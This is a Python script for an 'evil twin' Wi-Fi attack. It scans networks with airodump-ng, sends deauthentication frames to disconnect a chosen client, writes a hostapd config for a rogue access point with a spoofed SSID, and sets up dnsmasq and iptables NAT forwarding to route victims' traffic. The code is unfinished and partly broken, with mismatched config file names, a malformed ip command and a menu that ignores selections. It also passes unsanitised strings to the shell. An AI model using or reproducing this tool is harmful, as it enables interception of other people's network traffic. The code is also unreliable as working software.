import os
from simple_term_menu import TerminalMenu

def shell(command):
	stream = os.popen(command)
	return stream.read()

def displayMenu(interfaceAP, interfaceInternet, interfaceDeauth):
	shell('clear')
	print(shell("figlet EVILTWIN"))
	print("Interface AP :", interfaceAP)
	print("Interface Internet :", interfaceInternet)
	print("Interface DeAuth :", interfaceDeauth, "\n")

	options = ["Select Interface AP", "Select Interface Internet", "Select Interface Deauth"]
	terminal_menu = TerminalMenu(options)
	menu_entry_index = terminal_menu.show()

	match menu_entry_index:
		case 0:
			displayInterfaceMenu()
def displayInterfaceMenu():
	options = shell("ip -o link show | awk -F': ' '{print $2}'").split("\n")
	del options[-1]
	terminal_menu = TerminalMenu(options)
	menu_entry_index = terminal_menu.show()

def print_array(array):
	for row in array:
		print(row)

def print_array_column(array, x):
        for row in array:
                print(row[x])

def sort_array_by_x_column(array, x):
	for i in range(len(array)):
		for j in range(len(array)):
			if array[j] > array[i]and i != j:
				temp = array[j]
				array[j] = array[i]
				array[i] = temp
	return array

def airoScan(wlan):
	shell("airodump-ng " + wlan + " -w res/try & sleep 10; pkill airodump")

def firewallRouting(wlan):
	shell("echo 1 > /proc/sys/net/ipv4/ip_forward") #MODE FORWARD
	shell("iptables -F")
	shell("iptables -X")
	shell("iptables -I POSTROUTING -t nat -o " + wlan + " -j MASQUERADE")

def dnsmasqServer(file):
	shell("dnsmasq -d -C " + file)

def rogueApStart(wlan):
	shell("airmon-ng start " + wlan)
	shell("ip addr 192.168.1.1/24 dev " + wlan)

def hostapdInit(wlan, ssid):
	with open('confRogueAP.txt', 'w') as f:
		f.write('interface=' + wlan + '\n')
		f.write('ssid=' + ssid + '\n')
		f.write('hw_mode=g\n')
		f.write('channel=3')

def hostapdEnable():
	shell('hostapd confRogueAP')

def deAuth(wlan, bssid, MacDevice):
	shell('aireplay-ng -0 1 -a '+ bssid + ' -c ' + MacDevice + ' ' + wlan)

def airoScanTarget(wlan, bssid, channel):
	shell('airodump-ng -d ' + bssid + ' -c' + channel + ' ' + wlan)

